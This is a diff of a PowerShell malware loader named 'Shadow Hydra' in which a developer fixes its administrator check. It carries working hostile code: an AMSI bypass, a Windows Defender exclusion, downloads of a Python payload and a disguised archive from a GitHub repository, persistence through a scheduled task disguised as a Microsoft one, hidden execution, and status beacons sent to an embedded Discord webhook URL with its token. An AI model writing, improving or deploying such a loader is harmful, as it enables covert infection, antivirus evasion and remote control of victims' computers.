@@ -1,5 +1,5 @@
-# --- THE SHADOW HYDRA LOADER (V9.1 - STREAMLINED) ---
-# 0. BLIND THE WATCHDOG (AMSI BYPASS)
+# --- THE SHADOW HYDRA LOADER (V9.2 - FIXED ADMIN CHECK) ---
+# 0. BLIND THE WATCHDOG
 $a=[Ref].Assembly.GetTypes();foreach($b in $a){if($b.Name -like "*iUtils"){$c=$b.GetFields('NonPublic,Static');foreach($d in $c){if($d.Name -like "*Context"){$d.SetValue($null,$null)}}}}
 
 $WEBHOOK = "https://discord.com/api/webhooks/1505044718797586577/-gbKCGDVp0tz3RjJl3IfaTTU1xuu3ZBP4fmrL-jq_s0NbA_1iB8zFM0BURGTRTQcZg8U"
@@ -14,8 +14,9 @@ $TASK_NAME = "Microsoft\Windows\TextServicesFramework\MsCtfMonitorSystem"
 if (Get-Process -Name "ctfmon" | Where-Object { $_.Path -like "*$Path*" }) { exit }
 if (!(Test-Path $Path)) { New-Item -ItemType Directory -Path $Path -Force | Out-Null }
 
-# 1. ATTEMPT DEFENDER EXCLUSION
-if ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent().IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+# 1. ATTEMPT DEFENDER EXCLUSION (Fixed Syntax)
+$currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
+if ($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
     Add-MpPreference -ExclusionPath $Path -ErrorAction SilentlyContinue
 }
 
@@ -32,7 +33,7 @@ if (!(Test-Path $PY_MASK)) {
     Remove-Item $zip -ErrorAction SilentlyContinue
 }
 
-Send-Ghost "Syncing Logic..."
+Send-Ghost "Syncing Shadow Logic..."
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/itzcurled/footbalhunt/main/WinServices.py" -OutFile "$Path\WinServices.py"
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/itzcurled/footbalhunt/main/mui_cache.bin" -OutFile "$Path\mui_cache.zip"
 
@@ -49,4 +50,4 @@ Register-ScheduledTask -TaskName $TASK_NAME -Action $action -Trigger $trigger -S
 
 # 4. ENGAGE
 Start-Process -FilePath $PY_MASK -ArgumentList "`"$Path\WinServices.py`"" -WorkingDirectory $Path -WindowStyle Hidden
-Send-Ghost "Hydra v9.1 Online. Operation is live."
+Send-Ghost "Hydra v9.2 Online. Fixed and active."
